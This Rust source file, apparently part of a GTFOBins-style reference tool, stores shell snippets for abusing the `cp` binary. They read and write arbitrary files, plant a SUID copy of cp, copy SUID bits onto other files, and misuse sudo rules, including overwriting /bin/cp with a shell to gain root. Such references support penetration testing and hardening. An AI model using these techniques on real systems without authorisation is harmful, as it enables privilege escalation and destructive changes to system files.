pub static BIN_NAME: &'static str = "cp";
pub static FW_CODE: &'static str = r#"
    
    LFILE=file_to_write
    echo "DATA" | cp /dev/stdin "$LFILE"
"#;
pub static FR_CODE: &'static str = r#"
    
    LFILE=file_to_read
    cp "$LFILE" /dev/stdout
"#;
pub static SUID_CODE_1: &'static str = r#"
    
    sudo install -m =xs $(which cp) .

    LFILE=file_to_write
    echo "DATA" | ./cp /dev/stdin "$LFILE"
"#;
pub static SUID_DESC_2: &'static str = "
This can be used to copy and then read or write files from a restricted file systems or with elevated privileges. (The GNU version of `cp` has the `--parents` option that can be used to also create the directory hierarchy specified in the source path, to the destination folder.)";
pub static SUID_CODE_2: &'static str = r#"
    
    sudo install -m =xs $(which cp) .

    LFILE=file_to_write
    TF=$(mktemp)
    echo "DATA" > $TF
    ./cp $TF $LFILE
"#;
pub static SUID_DESC_3: &'static str =
    "This can copy SUID permissions from any SUID binary (e.g., `cp` itself) to another.";
pub static SUID_CODE_3: &'static str = r#"
    
    sudo install -m =xs $(which cp) .

    LFILE=file_to_change
    ./cp --attributes-only --preserve=all ./cp "$LFILE"
"#;
pub static SUDO_CODE_1: &'static str = r#"
    
    LFILE=file_to_write
    echo "DATA" | sudo cp /dev/stdin "$LFILE"
"#;
pub static SUOD_DESC_2: &'static str = "This can be used to copy and then read or write files from a restricted file systems or with elevated privileges. (The GNU version of `cp` has the `--parents` option that can be used to also create the directory hierarchy specified in the source path, to the destination folder.)";
pub static SUDO_CODE_2: &'static str = r#"
    
    LFILE=file_to_write
    TF=$(mktemp)
    echo "DATA" > $TF
    sudo cp $TF $LFILE
"#;
pub static SUDO_DESC_3: &'static str = "
This overrides `cp` itself with a shell (or any other executable) that is to be executed as root, useful in case a `sudo` rule allows to only run `cp` by path. Warning, this is a destructive action.";
pub static SUDO_CODE_3: &'static str = r#"
    
    sudo cp /bin/sh /bin/cp
    sudo cp
"#;
use crate::code::{Code, Tag};
pub static FW: Code<'static> = Code {
    title: "FW_CODE",
    code: FW_CODE,
    tag: Tag::FW,
};
pub static FR: Code<'static> = Code {
    title: "FR_CODE",
    code: FR_CODE,
    tag: Tag::FR,
};
pub static SUID_1: Code<'static> = Code {
    title: "SUID_CODE_1",
    code: SUID_CODE_1,
    tag: Tag::SUID,
};
pub static SUID_2: Code<'static> = Code {
    title: "SUID_CODE_2",
    code: SUID_CODE_2,
    tag: Tag::SUID,
};
pub static SUID_3: Code<'static> = Code {
    title: "SUID_CODE_3",
    code: SUID_CODE_3,
    tag: Tag::SUID,
};
pub static SUDO_1: Code<'static> = Code {
    title: "SUDO_CODE_1",
    code: SUDO_CODE_1,
    tag: Tag::SUDO,
};
pub static SUDO_2: Code<'static> = Code {
    title: "SUDO_CODE_2",
    code: SUDO_CODE_2,
    tag: Tag::SUDO,
};
pub static SUDO_3: Code<'static> = Code {
    title: "SUDO_CODE_3",
    code: SUDO_CODE_3,
    tag: Tag::SUDO,
};
